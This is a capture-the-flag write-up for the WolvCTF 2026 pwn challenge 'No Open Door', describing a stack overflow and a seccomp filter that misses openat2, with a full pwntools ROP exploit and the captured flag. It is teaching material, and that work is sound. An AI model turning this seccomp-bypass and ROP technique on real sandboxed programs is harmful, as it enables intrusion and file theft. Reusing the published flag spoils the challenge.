---
title: No Open Door
challenge_type: Pwn
difficulty: Medium
author: .ayushmk
writeup_author: "@xabito"
competition: wolvctf-2026
summary: |-
  The landlord blocked exec and open with seccomp and insists /flag is safe. Read the filter and find what they missed.
connections:
  - url: no-open-door.wolvctf-2026.kctf.cloud:1337
attachments:
  - title: dis.tar.gz
    url: /assets/files/wolvctf-2026/no-open-door/dis.tar.gz
---

## Recon

The attachment is a statically linked, not-stripped binary. Seccomp is Linux
syscall filtering. It installs a seccomp **allowlist**, then reads
attacker-controlled data onto the stack.

```bash
$ checksec --file=no-open-door
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

No PIE means every gadget and `.bss` address is fixed, with `.bss` providing
fixed writable static storage here. Return-oriented programming (ROP) chains
existing code gadgets through overwritten return addresses. Since the binary is
static, all gadgets live in the binary itself and no libc fingerprinting is
needed. `main` installs the filter, then overflows a 64-byte buffer with a
512-byte read:

```console
$ objdump -d no-open-door
main:
  call install_filter
  lea  rax, [rbp - 0x40]
  mov  edx, 0x200              ; 512 bytes into a 64-byte buffer
  mov  rsi, rax
  mov  edi, 0x0
  call read_full               ; loops until EXACTLY 0x200 bytes read
  leave
  ret
```

The saved RIP is at offset **72**, and `read_full` loops until exactly 0x200 bytes
arrive, so the payload must be padded to precisely 512 bytes or the chain never
runs.

## Exploitation

Decoding the Berkeley Packet Filter (BPF) program in `install_filter` shows a
short allowlist: `read`, `write`, `mmap`, `exit_group`, `brk`, `rt_sigreturn`,
`close`, `lseek`, and **`openat2` (syscall 437)**. Both `open` and `openat` are
blocked, but `openat2` is allowed.

```asm
[6] JEQ 1    (write)    -> ALLOW
[8] JEQ 437  (openat2)  -> ALLOW    ; <-- the miss
[10] JEQ 9   (mmap)     -> ALLOW
[16] JEQ 15  (rt_sigreturn) -> ALLOW
[22] RET KILL_PROCESS               ; default deny
```

`openat2` takes `(dirfd, pathname, struct open_how *, size)`; an all-zero
`open_how` means a plain `O_RDONLY` open. `HOW` points into untouched `.bss`,
which is zero-filled, so the `open_how` struct is all zeros without us writing
it. The bypass opens `/flag` with `openat2`, then uses `read` on the resulting
fd and `write` to send it to stdout.

The binary ships helper gadgets and a `syscall; ret` at 0x414b36, plus `pop rdi/rax`.
For the fourth argument `r10` there is a helper `G10` (`push rbp; pop r10; ret`); the
overflow also overwrites the saved `rbp`, so we store `24` (`sizeof(struct open_how)`)
there, and after `main`'s `leave` restores it into `rbp`, `G10` copies it into `r10`.

A second helper `XCHG` (`xchg rax, rdi; ret`) later moves the file descriptor that
`openat2` returns in `rax` into `rdi` for the `read`. The `/flag` path cannot live in
the overflow payload, because the stack is randomized by ASLR (address-space
layout randomization), so we stage it into the fixed `.bss` address with a
second, small `read` on the same socket.

## Flag capture

The exploit connects to the remote, sends the 512-byte first stage, then sends
the staged `/flag` path so the second `read` can store it in `.bss`:

```python
from pwn import *
import time

io = remote('no-open-door.wolvctf-2026.kctf.cloud', 1337)

POP_RDI=0x40212f; POP_RSI=0x40a13e; POP_RDX=0x401766; POP_RAX=0x448167
G10=0x401761; XCHG=0x40176b; SYSCALL=0x414b36; OFFSET=72
AT_FDCWD=0xffffffffffffff9c
PATHS=0x4ccb00; HOW=0x4ccb80; BUF=0x4cc900
q = p64

# read(0, PATHS, 0x40) to stage the flag path into .bss
r  = q(POP_RDI)+q(0)+q(POP_RSI)+q(PATHS)+q(POP_RDX)+q(0x40)+q(POP_RAX)+q(0)+q(SYSCALL)
# openat2(AT_FDCWD, PATHS, HOW, r10=24) -> fd in rax
r += q(POP_RDI)+q(AT_FDCWD)+q(POP_RSI)+q(PATHS)+q(POP_RDX)+q(HOW)+q(G10)+q(POP_RAX)+q(437)+q(SYSCALL)
r += q(XCHG)                                                        # rdi = fd
# read(fd, BUF, 0x100) then write(1, BUF, 0x100)
r += q(POP_RSI)+q(BUF)+q(POP_RDX)+q(0x100)+q(POP_RAX)+q(0)+q(SYSCALL)
r += q(POP_RDI)+q(1)+q(POP_RSI)+q(BUF)+q(POP_RDX)+q(0x100)+q(POP_RAX)+q(1)+q(SYSCALL)

pad = b'A'*64 + q(24)                       # saved-rbp slot = sizeof(open_how)
payload = (pad + r).ljust(0x200, b'B')      # read_full needs exactly 0x200 bytes
io.send(payload)                            # the overflow + ROP chain
time.sleep(0.5)
io.send(b'/flag\x00'.ljust(0x40, b'\x00'))  # the staged path (second read)

print(io.recvall())
```

The chain ends with `write(1, BUF, 0x100)`, so the flag comes back on the same
connection:

```
/flag\x00...\x00wctf{y0u_f0rg0t_t0_cl0se_0penat2}\n\x00...
```
